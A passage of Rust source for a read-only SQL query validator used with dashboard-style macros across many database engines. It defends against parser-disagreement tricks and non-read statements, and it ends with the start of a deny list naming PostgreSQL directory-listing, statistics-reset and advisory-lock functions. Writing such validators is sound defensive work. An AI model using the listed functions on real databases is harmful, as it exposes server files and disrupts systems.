                    && matches!(bytes.get(i + 2), Some(b'"' | b'\'')) =>
            {
                return reject(
                    "sql.unicode_escape",
                    "Unicode-escaped names and strings (U&\"...\", U&'...') are not allowed",
                );
            }
            _ => None,
        };
        if let Some(end) = skip_to {
            i = end;
            continue;
        }
        // ClickHouse here-doc strings (`$$...$$`, `$tag$...$tag$`) may be read differently by
        // ClickHouse and the checker's parser: in ClickHouse a `$` stands only in Kalzit's own
        // `$name`, `${name}` and `$__macro`, and never right before another `$`.
        let heredoc = |end: usize| engine.strict_dollar() && bytes.get(end) == Some(&b'$');
        if c == b'$' && sql[i + 1..].starts_with("__") {
            let (piece, end) = scan_macro(sql, i, engine)?;
            if heredoc(end) {
                return reject_dollar();
            }
            pieces.push(Piece::Text(&sql[text_start..i]));
            pieces.push(piece);
            i = end;
            text_start = end;
            continue;
        }
        if c == b'$' && sql[i + 1..].starts_with('{') {
            let close = sql[i..]
                .find('}')
                .map(|p| i + p)
                .ok_or_else(|| Rejected::new("sql.unclosed_variable", "unclosed ${...}"))?;
            let inner = &sql[i + 2..close];
            let (name, format) = match inner.split_once(':') {
                Some((n, f)) => (n, Some(f)),
                None => (inner, None),
            };
            if !valid_variable_name(name) {
                return Err(Rejected::new(
                    "sql.variable_name_invalid",
                    format!("invalid variable name in ${{{inner}}}"),
                )
                .with("name", inner));
            }
            let piece = match format {
                None => Piece::Variable(name),
                Some("identifier") => Piece::Identifier(name),
                Some(other) => {
                    return Err(Rejected::new(
                        "sql.variable_format_unknown",
                        format!("unknown variable format :{other}; only :identifier exists"),
                    )
                    .with("format", other));
                }
            };
            if heredoc(close + 1) {
                return reject_dollar();
            }
            pieces.push(Piece::Text(&sql[text_start..i]));
            pieces.push(piece);
            i = close + 1;
            text_start = i;
            continue;
        }
        if c == b'$' && sql[i + 1..].chars().next().is_some_and(is_ident_start) {
            let end = sql[i + 1..].find(|ch: char| !is_ident_char(ch)).map_or(sql.len(), |p| i + 1 + p);
            if heredoc(end) {
                return reject_dollar();
            }
            pieces.push(Piece::Text(&sql[text_start..i]));
            pieces.push(Piece::Variable(&sql[i + 1..end]));
            i = end;
            text_start = end;
            continue;
        }
        if c == b'$' && engine.strict_dollar() {
            return reject_dollar();
        }
        // Parameters written by hand would be bound to the wrong values or left unbound.
        let positional = match engine {
            Engine::Postgres => c == b'$' && bytes.get(i + 1).is_some_and(u8::is_ascii_digit),
            Engine::MySql => c == b'?',
            Engine::Sqlite => {
                matches!(c, b'?' | b'$' | b'@')
                    || (c == b':' && sql[i + 1..].chars().next().is_some_and(is_ident_start))
            }
            Engine::MsSql => {
                c == b'@'
                    && matches!(bytes.get(i + 1), Some(b'P' | b'p'))
                    && bytes.get(i + 2).is_some_and(u8::is_ascii_digit)
            }
            Engine::DataFusion => c == b'$' && bytes.get(i + 1).is_some_and(u8::is_ascii_digit),
            Engine::BigQuery | Engine::Snowflake | Engine::Databricks => c == b'?',
            Engine::ClickHouse => false,
            Engine::Oracle => c == b':' && bytes.get(i + 1).is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_'),
        };
        if positional {
            return reject("sql.placeholder", "write variables as $name; parameter placeholders are not supported");
        }
        // Step over a whole UTF-8 character so slices stay on character boundaries.
        i += sql[i..].chars().next().map_or(1, char::len_utf8);
    }
    pieces.push(Piece::Text(&sql[text_start..]));
    pieces.retain(|p| !matches!(p, Piece::Text("")));
    Ok(pieces)
}

/// Whether `--` (ending before `next`) starts a comment. MySQL and MariaDB need a space or a
/// control character after it; the checker's parser accepts any Unicode whitespace there. Where
/// the two would disagree (a non-ASCII space) the query is refused, so the checked text is the
/// executed text.
fn line_comment_after_dashes(sql: &str, next: usize, engine: Engine) -> Result<bool, Rejected> {
    if engine != Engine::MySql {
        return Ok(true);
    }
    match sql[next..].chars().next() {
        Some(c) if c.is_ascii() => Ok(c.is_ascii_whitespace() || c.is_ascii_control()),
        Some(c) if c.is_whitespace() => {
            reject("sql.dash_comment_space", "write -- comments with an ordinary space after the dashes")
        }
        _ => Ok(false),
    }
}

fn valid_variable_name(name: &str) -> bool {
    name.chars().next().is_some_and(is_ident_start) && name.chars().all(is_ident_char) && !name.starts_with("__")
}

fn scan_macro(sql: &str, start: usize, engine: Engine) -> Result<(Piece<'_>, usize), Rejected> {
    let name_end = sql[start + 1..].find(|ch: char| !is_ident_char(ch)).map_or(sql.len(), |p| start + 1 + p);
    let name = &sql[start + 1..name_end];
    let has_parens = sql[name_end..].starts_with('(');
    let empty_parens = sql[name_end..].starts_with("()");
    let simple = |piece| Ok((piece, if empty_parens { name_end + 2 } else { name_end }));
    match name {
        "__timeFrom" => simple(Piece::TimeFrom),
        "__timeTo" => simple(Piece::TimeTo),
        "__interval" => simple(Piece::Interval),
        "__interval_ms" => simple(Piece::IntervalMs),
        "__timeFilter" => {
            if !has_parens {
                return reject("sql.time_filter_column", "$__timeFilter needs a column: $__timeFilter(created_at)");
            }
            let close = sql[name_end..]
                .find(')')
                .map(|p| name_end + p)
                .ok_or_else(|| Rejected::new("sql.unclosed_time_filter", "unclosed $__timeFilter("))?;
            let column = sql[name_end + 1..close].trim();
            if !is_column_reference(column, engine) {
                return reject(
                    "sql.time_filter_column",
                    "$__timeFilter takes a column name such as created_at or t.\"Zeitpunkt\"",
                );
            }
            Ok((Piece::TimeFilter(column), close + 1))
        }
        "__unixEpochFrom" => simple(Piece::UnixEpochFrom),
        "__unixEpochTo" => simple(Piece::UnixEpochTo),
        "__unixEpochNanoFrom" => simple(Piece::UnixEpochNanoFrom),
        "__unixEpochNanoTo" => simple(Piece::UnixEpochNanoTo),
        "__time" | "__timeEpoch" | "__unixEpochFilter" | "__unixEpochNanoFilter" => {
            let (args, end) = macro_args(sql, name, name_end)?;
            let [col] = args.as_slice() else {
                return Err(macro_usage(name, "(column)"));
            };
            let col = column_arg(name, col, "(column)", engine)?;
            let piece = match name {
                "__time" => Piece::TimeColumn { col, epoch: false },
                "__timeEpoch" => Piece::TimeColumn { col, epoch: true },
                "__unixEpochFilter" => Piece::UnixEpochFilter { col, nanos: false },
                _ => Piece::UnixEpochFilter { col, nanos: true },
            };
            Ok((piece, end))
        }
        "__timeGroup" | "__timeGroupAlias" => {
            let usage = "(column, interval[, fill])";
            let (args, end) = macro_args(sql, name, name_end)?;
            let (col, interval, fill) = match args.as_slice() {
                [col, interval] => (col, interval, None),
                [col, interval, fill] => (col, interval, Some(*fill)),
                _ => return Err(macro_usage(name, usage)),
            };
            let col = column_arg(name, col, usage, engine)?;
            let interval = interval_arg(name, interval)?;
            let fill = fill.map(|f| fill_arg(name, f)).transpose()?;
            Ok((Piece::TimeGroup { col, interval, fill, alias: name == "__timeGroupAlias" }, end))
        }
        "__unixEpochGroup" | "__unixEpochGroupAlias" => {
            let usage = "(column, interval)";
            let (args, end) = macro_args(sql, name, name_end)?;
            let [col, interval] = args.as_slice() else {
                return Err(macro_usage(name, usage));
            };
            let col = column_arg(name, col, usage, engine)?;
            let interval = interval_arg(name, interval)?;
            Ok((Piece::UnixEpochGroup { col, interval, alias: name == "__unixEpochGroupAlias" }, end))
        }
        other => Err(Rejected::new("sql.macro_unknown", format!("unknown macro ${other}")).with("name", other)),
    }
}

/// How a macro is written, as the answer to a call that does not fit it.
fn macro_usage(name: &str, usage: &str) -> Rejected {
    Rejected::new("sql.macro_arguments", format!("write ${name}{usage}"))
        .with("name", format!("${name}"))
        .with("usage", format!("${name}{usage}"))
}

/// The arguments of the macro `name` whose `(` is at `open`, split at the commas outside quotes
/// and brackets, and the index after its `)`.
fn macro_args<'s>(sql: &'s str, name: &str, open: usize) -> Result<(Vec<&'s str>, usize), Rejected> {
    let unclosed =
        || Rejected::new("sql.unclosed_macro", format!("${name}( is not closed")).with("name", format!("${name}"));
    if !sql[open..].starts_with('(') {
        return Err(macro_usage(name, "(...)"));
    }
    let bytes = sql.as_bytes();
    let mut args = Vec::new();
    let mut start = open + 1;
    let mut depth = 0_usize;
    let mut i = open + 1;
    while i < bytes.len() {
        match bytes[i] {
            q @ (b'\'' | b'"' | b'`') => {
                i = skip_string(bytes, i, q, false).map_err(|_| unclosed())?;
                continue;
            }
            b'[' => {
                i = skip_bracket(bytes, i).map_err(|_| unclosed())?;
                continue;
            }
            b'(' => depth += 1,
            b')' if depth == 0 => {
                args.push(sql[start..i].trim());
                return Ok((args, i + 1));
            }
            b')' => depth -= 1,
            b',' if depth == 0 => {
                args.push(sql[start..i].trim());
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    Err(unclosed())
}

fn column_arg<'s>(name: &str, col: &'s str, usage: &str, engine: Engine) -> Result<&'s str, Rejected> {
    if is_column_reference(col, engine) {
        Ok(col)
    } else {
        Err(Rejected::new(
            "sql.macro_column",
            format!("${name} takes a column name such as created_at or t.\"Zeitpunkt\": ${name}{usage}"),
        )
        .with("name", format!("${name}")))
    }
}

fn interval_arg<'s>(name: &str, arg: &'s str) -> Result<IntervalArg<'s>, Rejected> {
    let bad = || {
        Rejected::new(
            "sql.macro_interval",
            format!("${name} takes an interval such as 1h, '5m', $__interval or an interval variable, not {arg}"),
        )
        .with("name", format!("${name}"))
        .with("value", arg)
    };
    if arg == "$__interval" {
        return Ok(IntervalArg::Auto);
    }
    if let Some(var) = arg.strip_prefix("${").and_then(|v| v.strip_suffix('}')).or_else(|| arg.strip_prefix('$')) {
        return if valid_variable_name(var) { Ok(IntervalArg::Variable(var)) } else { Err(bad()) };
    }
    duration_ms(arg).map(IntervalArg::Ms).ok_or_else(bad)
}

fn fill_arg(name: &str, arg: &str) -> Result<FillMode, Rejected> {
    if arg.eq_ignore_ascii_case("null") {
        return Ok(FillMode::Null);
    }
    if arg.eq_ignore_ascii_case("previous") {
        return Ok(FillMode::Previous);
    }
    match arg.parse::<f64>() {
        Ok(v) if v.is_finite() && arg.bytes().all(|b| b.is_ascii_digit() || matches!(b, b'.' | b'-' | b'+')) => {
            Ok(FillMode::Value(v))
        }
        _ => Err(Rejected::new(
            "sql.macro_fill",
            format!("${name} fills gaps with NULL, previous or a number, not {arg}"),
        )
        .with("name", format!("${name}"))
        .with("value", arg)),
    }
}

/// The longest interval a grouping macro takes: ten years.
const MAX_GROUP_MS: i64 = 10 * 365 * 86_400_000;

/// A duration such as `30s`, `5m`, `1h`, `1d`, `1w`, `1y`, `250ms` or `'1h'` (a bare number is
/// seconds), in milliseconds; `None` for anything else, zero and more than ten years.
pub fn duration_ms(text: &str) -> Option<i64> {
    let text = text.trim();
    let text = text.strip_prefix('\'').and_then(|t| t.strip_suffix('\'')).unwrap_or(text).trim();
    let digits = text.find(|c: char| !c.is_ascii_digit()).unwrap_or(text.len());
    if digits == 0 || digits > 12 {
        return None;
    }
    let n: i64 = text[..digits].parse().ok()?;
    let unit = match &text[digits..] {
        "ms" => 1,
        "" | "s" => 1_000,
        "m" => 60_000,
        "h" => 3_600_000,
        "d" => 86_400_000,
        "w" => 7 * 86_400_000,
        "y" => 365 * 86_400_000,
        _ => return None,
    };
    n.checked_mul(unit).filter(|ms| (1..=MAX_GROUP_MS).contains(ms))
}

/// The bucket size of a grouping macro in whole seconds, at least one.
fn group_seconds(ctx: &Context<'_>, interval: &IntervalArg<'_>) -> Result<i64, Rejected> {
    let ms = match interval {
        IntervalArg::Ms(ms) => *ms,
        IntervalArg::Auto => ctx.interval_ms as i64,
        IntervalArg::Variable(name) => {
            let bad = |value: &str| {
                Rejected::new(
                    "sql.macro_interval_variable",
                    format!("variable {name} must hold an interval such as 1h to group by time, not {value}"),
                )
                .with("name", name)
                .with("value", value)
            };
            match variable(ctx, name)? {
                Value::String(s) if s == "auto" || s == "$__interval" || s == "$__auto_interval" => {
                    ctx.interval_ms as i64
                }
                Value::String(s) => duration_ms(s).ok_or_else(|| bad(s))?,
                Value::Number(n) => n.as_i64().and_then(|s| s.checked_mul(1000)).ok_or_else(|| bad(&n.to_string()))?,
                other => return Err(bad(&other.to_string())),
            }
        }
    };
    Ok((ms.clamp(1, MAX_GROUP_MS) / 1000).max(1))
}

/// The name `time` as the engine quotes an alias.
fn time_alias(engine: Engine) -> &'static str {
    match engine {
        Engine::MySql | Engine::ClickHouse | Engine::BigQuery | Engine::Databricks => "`time`",
        Engine::MsSql => "[time]",
        Engine::Postgres | Engine::Sqlite | Engine::DataFusion | Engine::Oracle | Engine::Snowflake => "\"time\"",
    }
}

/// A time column as Unix seconds. SQLite reads numbers by the rule of `$__timeFilter` (seconds,
/// or milliseconds above `SQLITE_EPOCH_MS_ABOVE`) and text through `strftime`.
fn epoch_seconds(engine: Engine, col: &str) -> String {
    match engine {
        Engine::Postgres | Engine::DataFusion => format!("extract(epoch from {col})"),
        Engine::MySql => format!("UNIX_TIMESTAMP({col})"),
        Engine::MsSql => format!("DATEDIFF_BIG(second, '1970-01-01', {col})"),
        Engine::Sqlite => format!(
            "(CASE WHEN typeof({col}) IN ('integer', 'real') \
             THEN CAST((CASE WHEN abs({col}) > {SQLITE_EPOCH_MS_ABOVE} THEN {col} / 1000 ELSE {col} END) AS INTEGER) \
             ELSE CAST(strftime('%s', {col}) AS INTEGER) END)"
        ),
        Engine::ClickHouse => format!("toUnixTimestamp({col})"),
        Engine::Oracle => format!("ROUND((CAST({col} AS DATE) - DATE '1970-01-01') * 86400)"),
        Engine::BigQuery => format!("UNIX_SECONDS({col})"),
        Engine::Snowflake => format!("DATE_PART(EPOCH_SECOND, {col})"),
        Engine::Databricks => format!("unix_timestamp({col})"),
    }
}

/// The start of the `seconds`-long bucket holding a time column, counted from 1970-01-01 UTC, as
/// the engine's time type (SQLite: text `YYYY-MM-DD HH:MM:SS`, which `$__timeFilter` reads).
fn time_group(engine: Engine, col: &str, seconds: i64) -> String {
    let s = seconds;
    match engine {
        Engine::Postgres => format!("to_timestamp(floor(extract(epoch from {col}) / {s}) * {s})"),
        Engine::DataFusion => format!("date_bin(INTERVAL '{s} seconds', {col}, TIMESTAMP '1970-01-01T00:00:00Z')"),
        Engine::MySql => format!("FROM_UNIXTIME(FLOOR(UNIX_TIMESTAMP({col}) / {s}) * {s})"),
        Engine::MsSql => {
            // DATEADD takes an int, so the seconds since 1970 are added as days and seconds.
            // FLOOR, not integer division, so times before 1970 fall into the bucket before.
            let bucket =
                format!("CAST(FLOOR(CAST(DATEDIFF_BIG(second, '1970-01-01', {col}) AS float) / {s}) * {s} AS bigint)");
            format!(
                "DATEADD(second, CAST({bucket} % 86400 AS int), \
                 DATEADD(day, CAST({bucket} / 86400 AS int), CAST('1970-01-01' AS datetime2)))"
            )
        }
        Engine::Sqlite => format!("datetime({}, 'unixepoch')", sqlite_floor(&epoch_seconds(engine, col), s)),
        Engine::ClickHouse => format!("toDateTime(intDiv(toUnixTimestamp({col}), {s}) * {s}, 'UTC')"),
        Engine::Oracle => {
            format!("CAST(DATE '1970-01-01' + FLOOR({} / {s}) * {s} / 86400 AS TIMESTAMP)", epoch_seconds(engine, col))
        }
        Engine::BigQuery => format!("TIMESTAMP_SECONDS(CAST(FLOOR(UNIX_SECONDS({col}) / {s}) * {s} AS INT64))"),
        Engine::Snowflake => format!("TIME_SLICE({col}, {s}, 'SECOND')"),
        Engine::Databricks => format!("timestamp_seconds(floor(unix_timestamp({col}) / {s}) * {s})"),
    }
}

/// An integer expression rounded down to a multiple of `s`, also below zero: SQLite's `/` cuts
/// toward zero, and `floor()` exists only in builds with the math functions.
fn sqlite_floor(x: &str, s: i64) -> String {
    format!("({x} - (({x} % {s}) + {s}) % {s})")
}

/// The start of the `seconds`-long bucket holding a Unix seconds column, as Unix seconds.
fn unix_epoch_group(engine: Engine, col: &str, seconds: i64) -> String {
    let s = seconds;
    match engine {
        Engine::ClickHouse => format!("intDiv({col}, {s}) * {s}"),
        Engine::Sqlite => sqlite_floor(&format!("CAST({col} AS INTEGER)"), s),
        Engine::BigQuery => format!("CAST(FLOOR({col} / {s}) * {s} AS INT64)"),
        Engine::Postgres
        | Engine::DataFusion
        | Engine::MySql
        | Engine::MsSql
        | Engine::Oracle
        | Engine::Snowflake
        | Engine::Databricks => format!("FLOOR({col} / {s}) * {s}"),
    }
}

/// `col`, `t.col`, and names quoted as the engine quotes names: `"Quoted Col"` (PostgreSQL,
/// SQLite, SQL Server, ClickHouse, Oracle, Snowflake, InfluxDB), `` `col` `` (MySQL, SQLite,
/// ClickHouse, BigQuery, Databricks), `[col]` (SQL Server, SQLite): dotted identifiers, nothing
/// else. A quote the engine reads otherwise (a backtick in PostgreSQL is no quote, double quotes
/// make a string in MySQL) and a backslash, which some engines read as an escape inside quoted
/// names, are refused, so the macro's text is exactly the name the engine reads.
fn is_column_reference(s: &str, engine: Engine) -> bool {
    let (double, backtick, bracket) = match engine {
        Engine::Postgres | Engine::DataFusion | Engine::Oracle | Engine::Snowflake => (true, false, false),
        Engine::MySql | Engine::BigQuery | Engine::Databricks => (false, true, false),
        Engine::ClickHouse => (true, true, false),
        Engine::MsSql => (true, false, true),
        Engine::Sqlite => (true, true, true),
    };
    !s.is_empty()
        && s.split('.').all(|part| {
            let p = part.trim();
            let quoted = |allowed: bool, open: char, close: char| {
                allowed
                    && p.len() >= 2
                    && p.starts_with(open)
                    && p.ends_with(close)
                    && !p[1..p.len() - 1].contains([open, close, '\\'])
                    && !p[1..p.len() - 1].is_empty()
            };
            (p.chars().next().is_some_and(is_ident_start) && p.chars().all(is_ident_char))
                || quoted(double, '"', '"')
                || quoted(backtick, '`', '`')
                || quoted(bracket, '[', ']')
        })
}

/// The index after a ClickHouse name in backticks or double quotes at `start`; a backslash in it
/// is refused. A doubled quote is an escaped quote, as in the other engines.
fn skip_clickhouse_name(bytes: &[u8], start: usize) -> Result<usize, Rejected> {
    let end = skip_string(bytes, start, bytes[start], false)?;
    if bytes[start..end].contains(&b'\\') {
        return reject("sql.identifier_backslash", "quoted names may not contain a backslash");
    }
    Ok(end)
}

/// `NEXTVAL` or `CURRVAL`, in any case.
fn oracle_sequence_word(word: &str) -> bool {
    word.eq_ignore_ascii_case("nextval") || word.eq_ignore_ascii_case("currval")
}

/// A character of an Oracle name after its first: letters, digits, `_`, `$` and `#`.
fn oracle_name_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'_' | b'$' | b'#')
}

/// `q'` or `nq'` (in any case) at `i`, at the start of a word: an Oracle quote-delimited string.
fn oracle_q_quote_at(bytes: &[u8], i: usize) -> bool {
    let word_start = |at: usize| at == 0 || !oracle_name_char(bytes[at - 1]);
    bytes.get(i + 1) == Some(&b'\'')
        && (word_start(i) || (i > 0 && matches!(bytes[i - 1], b'n' | b'N') && word_start(i - 1)))
}

/// Whether the quote at `quote` opens a raw string: `r'...'`, `R"..."`, and BigQuery's raw bytes
/// `br'...'` / `rb'...'`, not the end of a longer name such as `bar'`.
fn raw_prefix(bytes: &[u8], quote: usize) -> bool {
    let at = |i: usize| bytes[i].to_ascii_lowercase();
    let starts_word = |i: usize| i == 0 || !is_ident_char(bytes[i - 1] as char);
    match quote {
        0 => false,
        1 => at(0) == b'r',
        _ => {
            let one = at(quote - 1);
            let two = at(quote - 2);
            (one == b'r' && starts_word(quote - 1))
                || (((one == b'r' && two == b'b') || (one == b'b' && two == b'r')) && starts_word(quote - 2))
        }
    }
}

/// The index after a raw string at `start`. A backslash in it is refused: the engines and the
/// checker's parser disagree on whether `\'` ends one. Raw triple-quoted strings are refused.
fn skip_raw_string(bytes: &[u8], start: usize) -> Result<usize, Rejected> {
    let quote = bytes[start];
    if bytes[start..].starts_with(&[quote, quote, quote]) {
        return reject("sql.raw_string", "raw strings with a backslash or in triple quotes are not allowed");
    }
    let end = bytes[start + 1..]
        .iter()
        .position(|b| *b == quote)
        .map(|p| start + 1 + p)
        .ok_or_else(|| Rejected::new("sql.unclosed_quote", "unclosed quote"))?;
    if bytes[start..end].contains(&b'\\') {
        return reject("sql.raw_string", "raw strings with a backslash or in triple quotes are not allowed");
    }
    Ok(end + 1)
}

/// The index after a BigQuery triple-quoted string (`'''...'''` or `"""..."""`) at `start`,
/// with backslash escapes.
fn skip_triple_quoted(bytes: &[u8], start: usize) -> Result<usize, Rejected> {
    let quote = bytes[start];
    let mut i = start + 3;
    while i < bytes.len() {
        if bytes[i] == b'\\' {
            i += 2;
        } else if bytes[i..].starts_with(&[quote, quote, quote]) {
            return Ok(i + 3);
        } else {
            i += 1;
        }
    }
    reject("sql.unclosed_quote", "unclosed quote")
}

/// The index after a BigQuery name in backticks at `start`. BigQuery reads backslash escapes in
/// it and no doubled backticks, so a name with a backslash is refused and the first backtick ends
/// it.
fn skip_bigquery_name(bytes: &[u8], start: usize) -> Result<usize, Rejected> {
    let end = bytes[start + 1..]
        .iter()
        .position(|b| *b == b'`')
        .map(|p| start + 1 + p)
        .ok_or_else(|| Rejected::new("sql.unclosed_quote", "unclosed quote"))?;
    if bytes[start..end].contains(&b'\\') {
        return reject("sql.identifier_backslash", "quoted names may not contain a backslash");
    }
    Ok(end + 1)
}

fn reject_dollar<T>() -> Result<T, Rejected> {
    reject("sql.dollar_quote", "a $ is allowed only in $name, ${name} and $__ macros; write strings in single quotes")
}

/// `{name:` at `i`: a ClickHouse query parameter.
fn clickhouse_parameter_at(sql: &str, i: usize) -> bool {
    let rest = sql[i + 1..].trim_start();
    let len = rest.find(|c: char| !is_ident_char(c)).unwrap_or(rest.len());
    len > 0 && rest.starts_with(is_ident_start) && rest[len..].trim_start().starts_with(':')
}

/// MySQL and ClickHouse strings take backslash escapes; PostgreSQL (and DataFusion) only in
/// `E'...'`.
fn backslash_escapes(engine: Engine, bytes: &[u8], quote: usize) -> bool {
    match engine {
        Engine::MySql | Engine::ClickHouse | Engine::BigQuery | Engine::Snowflake | Engine::Databricks => true,
        Engine::Postgres | Engine::DataFusion => {
            quote > 0
                && matches!(bytes[quote - 1], b'E' | b'e')
                && (quote < 2 || !is_ident_char(bytes[quote - 2] as char))
        }
        Engine::Sqlite | Engine::MsSql | Engine::Oracle => false,
    }
}

/// The index after a quoted string or identifier; the quote doubled is an escaped quote.
fn skip_string(bytes: &[u8], start: usize, quote: u8, backslash: bool) -> Result<usize, Rejected> {
    let mut i = start + 1;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' if backslash => i += 2,
            q if q == quote => {
                if bytes.get(i + 1) == Some(&quote) {
                    i += 2;
                } else {
                    return Ok(i + 1);
                }
            }
            _ => i += 1,
        }
    }
    reject("sql.unclosed_quote", "unclosed quote")
}

fn skip_bracket(bytes: &[u8], start: usize) -> Result<usize, Rejected> {
    let mut i = start + 1;
    while i < bytes.len() {
        if bytes[i] == b']' {
            if bytes.get(i + 1) == Some(&b']') {
                i += 2;
                continue;
            }
            return Ok(i + 1);
        }
        i += 1;
    }
    reject("sql.unclosed_bracket", "unclosed [")
}

fn skip_line(bytes: &[u8], start: usize) -> usize {
    bytes[start..].iter().position(|&b| b == b'\n').map_or(bytes.len(), |p| start + p + 1)
}

/// PostgreSQL and SQL Server nest block comments; MySQL and SQLite end at the first `*/`.
fn skip_block_comment(bytes: &[u8], start: usize, nested: bool) -> Result<usize, Rejected> {
    let mut depth = 0;
    let mut i = start;
    while i + 1 < bytes.len() {
        if bytes[i] == b'/' && bytes[i + 1] == b'*' {
            depth += 1;
            i += 2;
            if !nested && depth > 1 {
                depth = 1;
            }
        } else if bytes[i] == b'*' && bytes[i + 1] == b'/' {
            depth -= 1;
            i += 2;
            if depth == 0 {
                return Ok(i);
            }
        } else {
            i += 1;
        }
    }
    reject("sql.unclosed_comment", "unclosed comment")
}

/// `$$...$$` or `$tag$...$tag$`; `None` when the `$` does not open a dollar-quoted string.
fn dollar_quote_end(sql: &str, start: usize) -> Result<Option<usize>, Rejected> {
    let rest = &sql[start + 1..];
    let tag_len = rest.find(|c: char| !is_ident_char(c)).unwrap_or(rest.len());
    let tag = &rest[..tag_len];
    if !rest[tag_len..].starts_with('$') || tag.chars().next().is_some_and(|c| c.is_ascii_digit()) {
        return Ok(None);
    }
    let delimiter = format!("${tag}$");
    let body = start + delimiter.len();
    match sql[body..].find(&delimiter) {
        Some(p) => Ok(Some(body + p + delimiter.len())),
        None => reject("sql.unclosed_dollar_quote", "unclosed dollar-quoted string"),
    }
}

fn dialect(engine: Engine) -> Box<dyn Dialect> {
    match engine {
        Engine::Postgres | Engine::DataFusion => Box::new(PostgreSqlDialect {}),
        Engine::ClickHouse => Box::new(ClickHouseDialect {}),
        Engine::MySql => Box::new(MySqlDialect {}),
        Engine::Sqlite => Box::new(SQLiteDialect {}),
        Engine::MsSql => Box::new(MsSqlDialect {}),
        Engine::Oracle => Box::new(OracleDialect {}),
        Engine::BigQuery => Box::new(BigQueryDialect {}),
        Engine::Snowflake => Box::new(SnowflakeDialect {}),
        Engine::Databricks => Box::new(DatabricksDialect {}),
    }
}

/// Exactly one `SELECT`/`WITH` without `INTO`, locking clauses, data-modifying parts or forbidden
/// functions.
pub fn check_statement(sql: &str, engine: Engine) -> Result<(), Rejected> {
    // Reading a sequence advances it. Refused by its words, before parsing, so it does not
    // depend on whether the parser knows the T-SQL form.
    let words = sql.to_ascii_lowercase().split_whitespace().collect::<Vec<_>>().join(" ");
    if engine == Engine::MsSql && words.contains("next value for") {
        return reject("sql.sequence", "NEXT VALUE FOR changes a sequence and is not allowed");
    }
    // Query hints (`OPTION (...)`, which can take table locks) are refused as a keyword token,
    // wherever the parser would put them; in strings, comments and quoted names (`[option]`) the
    // word is no token and does not count.
    if engine == Engine::MsSql {
        let tokens = Tokenizer::new(&MsSqlDialect {}, sql).tokenize().map_err(|e| {
            Rejected::new("sql.parse_error", format!("the query could not be checked: {e}")).with("detail", e)
        })?;
        let hint = tokens
            .iter()
            .any(|t| matches!(t, Token::Word(w) if w.keyword == Keyword::OPTION && w.quote_style.is_none()));
        if hint {
            return reject("sql.query_hint", "query hints (OPTION (...)) are not allowed");
        }
    }
    // Oracle: `seq.NEXTVAL` advances a sequence, and `seq.CURRVAL` belongs to it. Refused as a word,
    // wherever it stands, as the parser reads `seq.NEXTVAL` as a plain column; in strings, comments
    // and quoted names the word is no token and does not count.
    if engine == Engine::Oracle {
        let tokens = Tokenizer::new(&OracleDialect {}, sql).tokenize().map_err(|e| {
            Rejected::new("sql.parse_error", format!("the query could not be checked: {e}")).with("detail", e)
        })?;
        let sequence = tokens
            .iter()
            .any(|t| matches!(t, Token::Word(w) if w.quote_style.is_none() && oracle_sequence_word(&w.value)));
        if sequence {
            return reject("sql.sequence", "NEXTVAL and CURRVAL use a sequence and are not allowed");
        }
    }
    let statements = Parser::parse_sql(dialect(engine).as_ref(), sql).map_err(|e| {
        Rejected::new("sql.parse_error", format!("the query could not be checked: {e}")).with("detail", e)
    })?;
    let [statement] = statements.as_slice() else {
        return if statements.is_empty() {
            reject("sql.empty", "the query is empty")
        } else {
            reject("sql.multiple_statements", "only one statement is allowed")
        };
    };
    if !matches!(statement, Statement::Query(_)) {
        return reject("sql.not_select", "only SELECT and WITH queries are allowed");
    }
    match statement.visit(&mut ReadOnlyCheck { engine }) {
        ControlFlow::Break(rejected) => Err(rejected),
        ControlFlow::Continue(()) => Ok(()),
    }
}

struct ReadOnlyCheck {
    engine: Engine,
}

/// The only SQL Server table hints a read may carry: reads without locks, and index and plan
/// choices.
const ALLOWED_MSSQL_HINTS: &[&str] = &["nolock", "readuncommitted", "index", "noexpand", "forceseek"];

/// The alias of any table factor, whatever its kind (table, derived table, function, OPENJSON,
/// pivot, nested join and the rest), so a hint list behind an alias is seen everywhere.
fn factor_alias(factor: &TableFactor) -> Option<&TableAlias> {
    match factor {
        TableFactor::Table { alias, .. }
        | TableFactor::Derived { alias, .. }
        | TableFactor::TableFunction { alias, .. }
        | TableFactor::Function { alias, .. }
        | TableFactor::UNNEST { alias, .. }
        | TableFactor::JsonTable { alias, .. }
        | TableFactor::OpenJsonTable { alias, .. }
        | TableFactor::NestedJoin { alias, .. }
        | TableFactor::Pivot { alias, .. }
        | TableFactor::Unpivot { alias, .. }
        | TableFactor::MatchRecognize { alias, .. }
        | TableFactor::XmlTable { alias, .. }
        | TableFactor::SemanticView { alias, .. } => alias.as_ref(),
        _ => None,
    }
}
/// Every SQL Server table hint word, to recognize the old hint form `t (TABLOCKX)` among the
/// arguments of a table-valued function call.
const MSSQL_HINT_WORDS: &[&str] = &[
    "nolock",
    "readuncommitted",
    "holdlock",
    "nowait",
    "paglock",
    "readcommitted",
    "readcommittedlock",
    "readpast",
    "repeatableread",
    "rowlock",
    "serializable",
    "snapshot",
    "tablock",
    "tablockx",
    "updlock",
    "xlock",
    "noexpand",
    "forceseek",
    "forcescan",
    "keepidentity",
    "keepdefaults",
    "ignore_constraints",
    "ignore_triggers",
];

/// The name of a table hint: `TABLOCKX`, or `INDEX` in `INDEX(ix)`.
fn hint_name(hint: &Expr) -> String {
    match hint {
        Expr::Identifier(ident) => ident.value.to_ascii_lowercase(),
        Expr::Function(f) => last_name_part(&f.name).unwrap_or_default(),
        // `INDEX = ix`, the other spelling of `INDEX(ix)`.
        Expr::BinaryOp { left, op: BinaryOperator::Eq, .. } if matches!(**left, Expr::Identifier(_)) => hint_name(left),
        other => other.to_string().to_ascii_lowercase(),
    }
}

fn last_name_part(name: &ObjectName) -> Option<String> {
    match name.0.last()? {
        ObjectNamePart::Identifier(ident) => Some(ident.value.to_ascii_lowercase()),
        ObjectNamePart::Function(f) => Some(f.name.value.to_ascii_lowercase()),
    }
}

/// Families of functions refused by prefix: directory listings, statistics resets, advisory locks, replication
/// slots and origins (creating, dropping, consuming changes), backups and WAL replay.
const FORBIDDEN_PREFIXES: &[&str] = &[
    // Directory listings: pg_ls_dir, pg_ls_logdir, pg_ls_waldir and those added later
    // (pg_ls_replslotdir, pg_ls_logicalsnapdir, ...).
    "pg_ls_",
    "pg_stat_reset",
    "pg_advisory",
